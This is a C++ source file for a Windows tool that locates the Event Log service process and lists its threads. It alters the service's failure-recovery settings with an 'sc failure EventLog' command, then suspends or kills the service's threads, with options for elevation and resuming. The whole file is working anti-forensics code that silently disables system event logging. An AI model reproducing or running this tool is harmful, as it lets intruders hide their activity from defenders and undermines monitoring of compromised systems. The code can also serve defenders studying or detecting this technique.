
//==============================================================================
//
//     main.cpp
//
//============================================================================
//  Copyright (C) Guilaume Plante 2020 <cybercastor@icloud.com>
//==============================================================================



#include "stdafx.h"
#include "win32.h"
#include "cmdline.h"
#include "Shlwapi.h"
#include <codecvt>
#include <locale>
#include <vector>
#include <unordered_map>
#include <iterator>
#include <regex>
#include "proc_info.h"
#include <filesystem>
#pragma message( "Compiling " __FILE__ )
#pragma message( "Last modified on " __TIMESTAMP__ )


int Capture()
{
	cProcInfo i_Proc;
	DWORD u32_Error = i_Proc.Capture();
	if (u32_Error)
	{
		printf("Error 0x%X capturing processes.\n", u32_Error);
		return 0;
	}
	/*
	SYSTEM_PROCESS* pk_Proc = i_Proc.FindProcessByPid(1948);
	if (!pk_Proc)
	{
		printf("The process does not exist.\n");
		return 0;
	}

	SYSTEM_THREAD* pk_Thread = i_Proc.FindThreadByTid(pk_Proc, 640);
	if (!pk_Thread)
	{
		printf("The thread does not exist.\n");
		return 0;
	}

	BOOL b_Suspend;
	i_Proc.IsThreadSuspended(pk_Thread, &b_Suspend);

	if (b_Suspend) printf("The thread is suspended.\n");
	else           printf("The thread is not suspended.\n");
	return 0;*/
}


int main(int argc, TCHAR **argv, TCHAR envp)
{

#ifdef UNICODE
	const char** argn = (const char**)C::Convert::allocate_argn(argc, argv);
#else
	char** argn = argv;
#endif // UNICODE

	CmdLineUtil::getInstance()->initializeCmdlineParser(argc, argn);

	CmdlineParser* inputParser = CmdLineUtil::getInstance()->getInputParser();

	CmdlineOption cmdlineOptionHelp({ "-h", "--help" }, "display this help");
	CmdlineOption cmdlineOptionVerbose({ "-v", "--verbose" }, "verbose output");
	CmdlineOption cmdlineOptionElevate({ "-e", "--elevate" }, "elevete account privileges to administrator when launching application");
	CmdlineOption cmdlineOptionListProcess({ "-l", "--list" }, "list the processes currently running");
	CmdlineOption cmdlineOptionResume({ "-r", "--resume" }, "resume the win event threads");
	CmdlineOption cmdlineOptionPid({ "-p", "--pid" }, "force pid");

	CmdlineOption cmdlineOptionTerminate({ "-t", "--terminate" }, "terminate instead of suspending");

	inputParser->addOption(cmdlineOptionHelp);
	inputParser->addOption(cmdlineOptionVerbose);
	inputParser->addOption(cmdlineOptionListProcess);
	inputParser->addOption(cmdlineOptionElevate);
	inputParser->addOption(cmdlineOptionResume);
	inputParser->addOption(cmdlineOptionPid);
	inputParser->addOption(cmdlineOptionTerminate);

	bool optHelp = inputParser->isSet(cmdlineOptionHelp);
	bool optVerbose = inputParser->isSet(cmdlineOptionVerbose);
	bool optListProcess = inputParser->isSet(cmdlineOptionListProcess);
	bool optElevate = inputParser->isSet(cmdlineOptionElevate);
	bool optDebugResume = inputParser->isSet(cmdlineOptionResume);
	bool optPid = inputParser->isSet(cmdlineOptionPid);
	bool optTerminateThread = inputParser->isSet(cmdlineOptionTerminate);

	DWORD forcedPid = -1;
	if(optPid){
		const std::string& strPid = inputParser->getCmdOption("-p");
		forcedPid = atoi(strPid.c_str());
	}
	
	if (optElevate) {
		if (C::Process::IsRunAsAdministrator()) {
			std::cout << "The applicaiton is already running with admin privileges" << std::endl;
		}
		else {
			C::Process::ElevateNow(argc, *argv, envp);
		}
	}
	cProcInfo i_Proc;
	DWORD u32_Error = i_Proc.Capture();
	if (u32_Error)
	{
		PRINT_OUT("[+] Error 0x%X capturing processes.\n", u32_Error);
		return 0;
	}
	DWORD Res = 0;
	if( (optListProcess == TRUE)  || (C::Process::CheckIntegrityLevel() == TRUE) ) {

		PRINT_OUT("[+] Process Integrity Level is high, continuing...\n");
		
		if (C::Process::IsDebugPrivilegeEnabled() == TRUE) {
			DWORD HighPid = 0;
			if(optPid && forcedPid != -1){
				HighPid = forcedPid;
				PRINT_OUT("[+] Using PID %d .\n\n", HighPid);
			}else{
				DWORD dwEventLogPID = C::WinEvent::GetPIDFromSCManager();

				if (dwEventLogPID != 0) {
					PRINT_OUT("[+] Event Log service PID detected as %d using GetPIDFromSCManager.\n", dwEventLogPID);
					HighPid = dwEventLogPID;
				}else{
					dwEventLogPID = C::WinEvent::GetPIDFromWMI();
				}
		
				if (dwEventLogPID != 0) {
					PRINT_OUT("[+] Event Log service PID detected as %d using GetPIDFromWMI.\n", dwEventLogPID);
					HighPid = dwEventLogPID;
				}else{
					return -1;
				}
			}
			SYSTEM_PROCESS* pk_Proc = i_Proc.FindProcessByPid(HighPid);
			if (!pk_Proc)
			{
				printf("[!] The process %d does not exist.\n", HighPid);
				return 0;
			}

			C::Process::TThreads threads;
			int threadProcessed = 0;
			C::Process::ListProcessThreads(HighPid, threads);
			int threadCount = threads.size();
			PRINT_OUT("[+] LIST OF CHILDS THREADS (%d) SPAWNED FROM %d\n", threads.size() ,HighPid);
			PRINT_OUT("[+] TID\t\tSTART ADDRESS\tPARENT\tSTATE\tIS SUSPENDED?\tCREATION TIME\n");
			int x=0;
			for (C::Process::SThreadEntry t : threads) {

				SYSTEM_THREAD* pk_Thread = i_Proc.FindThreadByTid(pk_Proc, t.threadId);
				if (!pk_Thread) { continue; }

				
				TIME_FIELDS timeField;
				C::WinTime::TimeToTimeFields(&pk_Thread->CreateTime, &timeField);
				BOOL b_Suspend;
				bool isSuspended = i_Proc.IsThreadSuspended(pk_Thread, &b_Suspend);
				char state[32];


				char strTime[64];
				sprintf(strTime, "%d/%d/%d %d:%d", timeField.Day, timeField.Month, timeField.Year, timeField.Hour, timeField.Minute);

				if (pk_Thread->ThreadState == THREAD_STATE::Running) {
					strcpy(state, "Running");
				}
				else {
					strcpy(state, "Waiting");
				}
				char suspended_State[32];
				if (isSuspended) {
					strcpy(suspended_State, "   YES");
				}
				else {
					strcpy(suspended_State, "   NO MATE");
				}
				PRINT_OUT("[%2d] %4d\t0x%08X\t%d\t%s\t%s\t%s\n", x, t.threadId, t.startAddress, t.parentPid, state, suspended_State, strTime);
				x++;
			}

			if (optListProcess == TRUE) {
				PRINT_OUT("[+] Listing only, exiting...\n");
				return 0;
			}

			
			system("sc failure EventLog reset= 86400 actions= //15000//30000//1000");

			
			char action[128];
			if (optTerminateThread) {
				strcpy(action, "KILLING THREADS");
			}
			else {
				strcpy(action, "SUSPENDING THREADS");
			}
			PRINT_OUT("[+] REQUESTED ACTION: %s \n", action);
			x = 0;
			for (C::Process::SThreadEntry t : threads) {
				HANDLE Invalid = (HANDLE)-1;
				HANDLE hThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE | THREAD_SUSPEND_RESUME, FALSE, t.threadId);
				if (hThread == Invalid) {
					PRINT_OUT("[+] OpenThread Error %d. GetLastError 0x%08X\n", t.threadId, GetLastError());
					continue;
				}
				
				if (optDebugResume) {
					Res = ResumeThread(hThread);
					if (Res == -1) {
						PRINT_OUT("[+] ResumeThread Error %d. GetLastError 0x%08X\n", t.threadId, GetLastError());
						continue;
					}
					else
					{
						PRINT_OUT("[+] Thread Resumed %d\n. \n", t.threadId);
					}
				}
				else {

					if (optTerminateThread) { Res = TerminateThread(hThread,0);	}
					else {Res = SuspendThread(hThread); }

					if (Res == -1) {
						PRINT_OUT("[+] TerminateThread Error %d. GetLastError 0x%08X\n", t.threadId, GetLastError());
						continue;
					}
					else{
						threadProcessed++;
						PRINT_OUT("[+] Thread TerminateThread %d returned %d\n", t.threadId, Res);
					}


					PRINT_OUT("[+] Thread Processed %d / %d thread count\n", threadProcessed, threadCount);
					
					if(threadProcessed == (threadCount-2)){
						PRINT_OUT("[+] Exiting\n", threadProcessed, threadCount);
						break;
					}



	

				}
				

			
			}
			return Res;
		}
		else {

			PRINT_OUT("[!] SeDebugPrivilege cannot enabled. Exiting...\n");

		}

	}
	else {

		PRINT_OUT("[!] Process Integrity Level is not high. Exiting...\n");

	}


	return Res;
}
